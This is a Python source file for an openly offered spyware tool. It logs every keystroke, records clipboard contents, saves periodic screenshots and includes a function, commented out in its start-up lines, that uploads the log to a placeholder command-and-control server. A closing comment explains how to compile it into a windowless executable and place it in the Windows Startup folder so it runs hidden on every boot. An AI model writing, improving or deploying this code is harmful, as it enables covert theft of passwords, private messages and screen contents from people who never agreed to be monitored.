import keyboard
import requests
import os
import pyperclip
import time
import mss
import threading

log_file="keylog.txt"

last_clipboard_event= None
lock = threading.Lock()
screenshot_counter = 1

def log_key(key):
	key_str=str(key)
	if "Key." in key_str:
		key_str=key_str.split(".")[-1]

	with lock:
		with open(log_file,"a") as f:
			f.write(f"{time.ctime()}: {key_str}\n")	

def mointor_clipboard():
	global last_clipboard_event
	while True:
		current_content=pyperclip.paste()
		if current_content!=last_clipboard_event:
			last_clipboard_event=current_content

			with lock:
				with open(log_file,"a")as f:
					f.write(f"[*] Clipboard changed at {time.ctime()} with: {current_content}\n")
		
		time.sleep(2)	

def take_screenshot():
	with mss.mss() as sct:
		global screenshot_counter
		while True:
			screenshot_filename =f"screenshot-{screenshot_counter}.png"
			sct.shot(output=screenshot_filename)
			with lock:
				with open(log_file,"a") as f:
					f.write(f"Screenshot taken at {time.ctime()} , {screenshot_filename} \n")
			screenshot_counter+=1	
			time.sleep(15)


def send_logs_to_server():
	
	while True:
		time.sleep(40)
		try:
			with open(log_file,"rb")as f:
				requests.post("http://<your c2 server>/upload",files={"file": f})
		except Exception as e:
			print(f"[ERROR] couldn't send logs : {e} ")

def stop_logging(e = None):
	print("Stop Logging ... ")
	keyboard.unhook_all()
	os._exit(0)


keyboard.hook(log_key)
keyboard.add_hotkey('ctrl+shift+q',stop_logging)

threading.Thread(target=mointor_clipboard,daemon=True).start()
threading.Thread(target=take_screenshot,daemon=True).start()
#threading.Thread(target=send_logs_to_server,daemon=True).start()

print("Keyboard is running... press CTRL+shift+q to stop")

keyboard.wait()

"""
You can convert the Python script into an executable and run it in the background by following these steps:
Convert Script to Executable (Optional):
You can use pyinstaller to convert your script into a Windows executable:

pyinstaller --onefile --noconsole your_script.py
The --noconsole option ensures that the script runs without showing a command prompt window. This will create an executable you can run, which will run without a visible interface.

Start in Background:
You can manually start the executable or script as a background process by creating a .bat file like this:

start "" "your_script.exe"
You can place this .bat file in your startup folder to ensure the script runs automatically when Windows starts:

C:\\Users\\<Your Username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

"""
